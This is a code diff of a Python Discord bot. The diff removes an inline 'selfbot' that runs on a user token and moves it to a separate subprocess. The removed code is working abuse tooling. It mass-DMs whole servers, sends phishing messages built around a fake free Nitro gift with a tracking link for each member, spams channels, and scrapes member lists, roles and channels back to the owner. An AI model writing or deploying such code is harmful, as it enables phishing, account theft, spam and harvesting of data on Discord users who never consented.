@@ -19,7 +19,6 @@ import threading
 import asyncio
 import os
 import sys
-from typing import Optional
 
 # ── selfbot runs on discord.py-self which conflicts with discord.py
 # ── we import them in separate modules to avoid namespace collision
@@ -83,222 +82,24 @@ DM_DELAY   = 1.2
 SPAM_DELAY = 0.8
 
 def _run_selfbot():
-    """Runs in its own thread with its own event loop."""
+    """Runs selfbot.py as a subprocess — avoids discord.py namespace collision."""
     if not SELF_TOKEN or SELF_TOKEN == "YOUR_USER_TOKEN_HERE":
         print("[SB] SELF_TOKEN not set — selfbot disabled.")
         return
-
+    import subprocess
+    env = os.environ.copy()
+    print("[SB] Launching selfbot subprocess...")
     try:
-        import discord as _dself
-    except ImportError:
-        print("[SB] discord.py-self not installed — selfbot disabled.")
-        return
-
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-
-    sb = _dself.Client()
-
-    @sb.event
-    async def on_ready():
-        print(f"[SB] Logged in as {sb.user} | {len(sb.guilds)} servers")
-
-    async def _reply(msg, text):
-        try:
-            m = await msg.channel.send(text)
-            await asyncio.sleep(15)
-            await m.delete()
-        except Exception:
-            pass
-
-    async def _report(text):
-        if OWNER_ID:
-            try:
-                u = await sb.fetch_user(OWNER_ID)
-                await u.send(text)
-            except Exception:
-                pass
-
-    @sb.event
-    async def on_message(message):
-        if message.author.id != sb.user.id:
-            return
-        if not message.content.startswith(SB_PREFIX):
-            return
-        try:
-            await message.delete()
-        except Exception:
-            pass
-
-        content = message.content[len(SB_PREFIX):].strip()
-        parts   = content.split(" ", 1)
-        cmd     = parts[0].lower()
-        args    = parts[1] if len(parts) > 1 else ""
-
-        if cmd == "ping":
-            await _reply(message, f"🏓 {round(sb.latency * 1000)}ms")
-
-        elif cmd == "help":
-            await _reply(message, (
-                "**LH Selfbot** (prefix: `>>`)\n"
-                "`>>spy` `>>members <id>` `>>massdm <id> <msg>`\n"
-                "`>>phish <id>` `>>spam <id> <ch> <n> <msg>`\n"
-                "`>>join <code>` `>>leave <id>` `>>scrape <id>`\n"
-                "`>>status <text>` `>>purge <n>` `>>ping`"
-            ))
-
-        elif cmd == "spy":
-            if not sb.guilds:
-                await _reply(message, "Not in any servers."); return
-            lines = ["**Servers:**"]
-            for g in sb.guilds:
-                lines.append(f"`{g.id}` — **{g.name}** | {g.member_count} members")
-            for chunk in ["\n".join(lines)[i:i+1900] for i in range(0, len("\n".join(lines)), 1900)]:
-                await _report(chunk)
-            await _reply(message, f"📡 Report sent to DMs. ({len(sb.guilds)} servers)")
-
-        elif cmd == "members":
-            if not args:
-                await _reply(message, "Usage: `>>members <serverID>`"); return
-            try: guild = sb.get_guild(int(args.strip()))
-            except ValueError: await _reply(message, "Invalid ID."); return
-            if not guild: await _reply(message, "Not in that server."); return
-            lines = [f"Members — {guild.name}"]
-            for m in guild.members:
-                joined = m.joined_at.strftime("%Y-%m-%d") if m.joined_at else "?"
-                lines.append(f"{m} | {m.id} | {joined} | bot={m.bot}")
-            report = "\n".join(lines)
-            for chunk in [report[i:i+1900] for i in range(0, len(report), 1900)]:
-                await _report(f"```\n{chunk}\n```")
-            await _reply(message, f"📋 Sent to DMs. ({len(guild.members)} members)")
-
-        elif cmd == "massdm":
-            sub = args.split(" ", 1)
-            if len(sub) < 2: await _reply(message, "Usage: `>>massdm <id> <msg>`"); return
-            try: guild = sb.get_guild(int(sub[0]))
-            except ValueError: await _reply(message, "Invalid ID."); return
-            if not guild: await _reply(message, "Not in that server."); return
-            ok = 0; fail = 0
-            await _reply(message, f"📨 Mass DM starting — {guild.name}...")
-            for member in guild.members:
-                if member.bot or member.id == sb.user.id: continue
-                try:
-                    await member.send(sub[1]); ok += 1
-                    await asyncio.sleep(DM_DELAY)
-                except Exception: fail += 1
-            await _report(f"✅ Mass DM done — {guild.name}\nSent: {ok} | Failed: {fail}")
-
-        elif cmd == "phish":
-            if not args: await _reply(message, "Usage: `>>phish <id>`"); return
-            if not PHISH_URL: await _reply(message, "❌ PHISH_URL not set."); return
-            try: guild = sb.get_guild(int(args.strip()))
-            except ValueError: await _reply(message, "Invalid ID."); return
-            if not guild: await _reply(message, "Not in that server."); return
-            ok = 0; fail = 0
-            await _reply(message, f"🎣 Phish DM starting — {guild.name}...")
-            for member in guild.members:
-                if member.bot or member.id == sb.user.id: continue
-                link = f"{PHISH_URL}/claim/{member.id}"
-                try:
-                    await member.send(
-                        f"🎁 **You have a Discord Nitro gift waiting!**\n\n"
-                        f"Someone sent you **3 months of Nitro** for free.\n"
-                        f"Claim it here before it expires:\n{link}\n\n"
-                        f"*Offer valid for 48 hours.*"
-                    )
-                    ok += 1
-                    await asyncio.sleep(DM_DELAY)
-                except Exception: fail += 1
-            await _report(f"🎣 Phish done — {guild.name}\nSent: {ok} | Failed: {fail}")
-
-        elif cmd == "spam":
-            sub = args.split(" ", 3)
-            if len(sub) < 4: await _reply(message, "Usage: `>>spam <serverID> <channelID> <count> <msg>`"); return
-            try:
-                guild   = sb.get_guild(int(sub[0]))
-                channel = sb.get_channel(int(sub[1]))
-                count   = max(1, min(int(sub[2]), 500))
-                txt     = sub[3]
-            except Exception: await _reply(message, "Invalid args."); return
-            if not guild or not channel: await _reply(message, "Server/channel not found."); return
-            sent = 0
-            for _ in range(count):
-                try:
-                    await channel.send(txt); sent += 1
-                    await asyncio.sleep(SPAM_DELAY)
-                except Exception: break
-            await _report(f"💬 Spam done — {sent}/{count} in #{channel.name} ({guild.name})")
-
-        elif cmd == "join":
-            if not args: await _reply(message, "Usage: `>>join <invite>`"); return
-            code = args.strip().split("/")[-1]
-            try:
-                inv = await sb.fetch_invite(code)
-                await inv.accept()
-                await asyncio.sleep(2)
-                await _reply(message, f"✅ Joined **{inv.guild.name}**")
-                await _report(f"✅ Joined: **{inv.guild.name}** (`{inv.guild.id}`)")
-            except Exception as e:
-                await _reply(message, f"❌ Failed: `{e}`")
-
-        elif cmd == "leave":
-            if not args: await _reply(message, "Usage: `>>leave <id>`"); return
-            try: guild = sb.get_guild(int(args.strip()))
-            except ValueError: await _reply(message, "Invalid ID."); return
-            if not guild: await _reply(message, "Not in that server."); return
-            name = guild.name
-            try:
-                await guild.leave()
-                await _reply(message, f"✅ Left **{name}**")
-            except Exception as e:
-                await _reply(message, f"❌ Failed: `{e}`")
-
-        elif cmd == "scrape":
-            if not args: await _reply(message, "Usage: `>>scrape <id>`"); return
-            try: guild = sb.get_guild(int(args.strip()))
-            except ValueError: await _reply(message, "Invalid ID."); return
-            if not guild: await _reply(message, "Not in that server."); return
-            lines = [
-                f"**{guild.name}** (`{guild.id}`)",
-                f"Owner: `{guild.owner_id}` | Members: {guild.member_count}",
-                f"Channels: {len(guild.channels)} | Roles: {len(guild.roles)}",
-                f"Boost: {guild.premium_tier} | Created: {guild.created_at.strftime('%Y-%m-%d')}",
-                "", "**Roles:**",
-            ]
-            for r in sorted(guild.roles, key=lambda r: r.position, reverse=True):
-                if not r.is_default():
-                    lines.append(f"  `{r.id}` {r.name} ({len(r.members)} members)")
-            lines.append("\n**Channels:**")
-            for ch in guild.text_channels:
-                lines.append(f"  `{ch.id}` #{ch.name}")
-            report = "\n".join(lines)
-            for chunk in [report[i:i+1900] for i in range(0, len(report), 1900)]:
-                await _report(chunk)
-            await _reply(message, "📊 Scrape sent to DMs.")
-
-        elif cmd == "status":
-            if not args: await _reply(message, "Usage: `>>status <text>`"); return
-            try:
-                await sb.change_presence(activity=_dself.CustomActivity(name=args))
-                await _reply(message, f"✅ Status: `{args}`")
-            except Exception as e:
-                await _reply(message, f"❌ `{e}`")
-
-        elif cmd == "purge":
-            if not args: await _reply(message, "Usage: `>>purge <n>`"); return
-            try: count = max(1, min(int(args.strip()), 100))
-            except ValueError: await _reply(message, "Invalid number."); return
-            deleted = 0
-            async for msg in message.channel.history(limit=200):
-                if msg.author.id == sb.user.id:
-                    try:
-                        await msg.delete(); deleted += 1
-                        await asyncio.sleep(0.3)
-                    except Exception: pass
-                if deleted >= count: break
-            await _reply(message, f"🗑️ Deleted {deleted} messages.")
-
-    loop.run_until_complete(sb.start(SELF_TOKEN))
+        proc = subprocess.Popen(
+            [sys.executable, "selfbot.py"],
+            env=env,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+        )
+        for line in iter(proc.stdout.readline, b""):
+            print("[SB]", line.decode(errors="replace").rstrip())
+    except Exception as e:
+        print(f"[SB] Subprocess error: {e}")
 
 
 # ─────────────────────────────────────────────────────────────
